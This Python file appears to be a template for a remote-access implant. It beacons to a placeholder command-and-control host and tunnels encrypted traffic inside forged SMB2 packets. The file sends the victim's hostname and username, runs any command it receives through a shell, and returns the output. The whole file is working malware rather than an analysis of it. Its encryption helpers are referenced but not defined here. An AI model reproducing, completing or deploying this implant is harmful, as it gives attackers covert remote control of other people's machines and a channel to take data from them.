#!/usr/bin/env python3
import json, platform, subprocess, os, getpass, socket, base64, sys, time, struct, hashlib

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}
ENCRYPTION_KEY = b"{{ENCRYPTION_KEY}}"

def stealth_sleep(seconds):
    fn = globals().get('sleep_encrypt')
    buf = bytearray(32)
    if fn:
        try:
            fn(seconds, buf)
            return
        except Exception:
            pass
    time.sleep(seconds)
SMB2 = b'\xfeSMB'
FILE_REQ = 0x10
FILE_RESP = 0x20

def _key():
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=b'sockpuppets-salt-v1', info=b'sockpuppets-aes-256-gcm-v1').derive(ENCRYPTION_KEY)

def simple_encrypt(data: str) -> str:
    return wire_encrypt(data)

def simple_decrypt(data: str) -> str:
    return wire_decrypt(data)

def _hdr(command, message_id, session_id=0, tree_id=0):
    return struct.pack('<4sHHIHHIIQII8s16s', SMB2, 64, 0, 0, command, 1, 1, 0, message_id, 0, tree_id, session_id.to_bytes(8, 'little'), b'\x00'*16)

def _frame(body):
    return b'\x00' + struct.pack('>I', len(body))[1:] + body

def _unframe(buf):
    if len(buf) < 4:
        return None, buf
    length = int.from_bytes(buf[1:4], 'big')
    if len(buf) < 4 + length:
        return None, buf
    return buf[4:4+length], buf[4+length:]

def exchange(payload: str) -> str:
    sock = socket.create_connection((SERVER_HOST, SERVER_PORT), timeout=8)
    sock.settimeout(8)
    def rpc(body):
        sock.sendall(_frame(body))
        buf = b''
        while True:
            buf += sock.recv(65536)
            msg, buf = _unframe(buf)
            if msg:
                return msg
    rpc(_hdr(0, 1) + struct.pack('<HHHHI16sQ', 36, 1, 1, 0, 0, b'\x11'*16, 0) + struct.pack('<H', 0x0210))
    rpc(_hdr(1, 2) + struct.pack('<HBBIIHHQ', 25, 0, 0, 0, 0, 88, 1, 0) + b'\x00')
    rpc(_hdr(3, 3, session_id=0x1000) + struct.pack('<HHH', 9, 72, 8) + 'C2'.encode('utf-16le'))
    name = 'req'.encode('utf-16le')
    create = bytearray(64)
    struct.pack_into('<H', create, 0, 57)
    struct.pack_into('<HH', create, 44, 128, len(name))
    rpc(_hdr(5, 4, session_id=0x1000, tree_id=1) + bytes(create) + name)
    blob = payload.encode()
    write = bytearray(48) + blob
    struct.pack_into('<H', write, 0, 49)
    struct.pack_into('<H', write, 2, 112)
    struct.pack_into('<I', write, 4, len(blob))
    write[16:32] = FILE_REQ.to_bytes(16, 'little')
    rpc(_hdr(9, 5, session_id=0x1000, tree_id=1) + bytes(write))
    read = bytearray(49)
    struct.pack_into('<H', read, 0, 49)
    struct.pack_into('<I', read, 4, 1024*1024)
    read[16:32] = FILE_RESP.to_bytes(16, 'little')
    reply = rpc(_hdr(8, 6, session_id=0x1000, tree_id=1) + bytes(read))
    sock.close()
    data_off, length = struct.unpack_from('<HI', reply, 66)
    return reply[data_off:data_off+length].decode()

def execute_command(command: str) -> str:
    if command == '__kill':
        sys.exit(0)
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return (result.stdout + result.stderr) or 'Command executed successfully (no output)'
    except Exception as e:
        return f'Error: {e}'

def connect_to_server():
    agent_id = None
    pending = []
    while True:
        try:
            if not agent_id:
                meta = {'hostname': socket.gethostname(), 'username': getpass.getuser(), 'os': platform.system(), 'mode': 'beacon', 'beacon_interval': BEACON_INTERVAL}
                reply = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps({'type': 'register', 'metadata': meta})))))
                agent_id = reply.get('agent_id') or None
                if not agent_id:
                    stealth_sleep(5)
                    continue
            msg = {'type': 'checkin', 'agent_id': agent_id, 'metadata': {'mode': 'beacon', 'beacon_interval': BEACON_INTERVAL, 'hostname': socket.gethostname()}, 'results': pending}
            pending = []
            data = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps(msg)))))
            if data.get('type') == 'registered':
                agent_id = data.get('agent_id')
                continue
            for cmd in data.get('commands') or []:
                command = cmd.get('command', '')
                if command == '__kill':
                    sys.exit(0)
                if command:
                    pending.append({'type': 'response', 'command': command, 'output': execute_command(command), 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
            stealth_sleep(BEACON_INTERVAL)
        except Exception:
            stealth_sleep(5)

if __name__ == '__main__':
    connect_to_server()
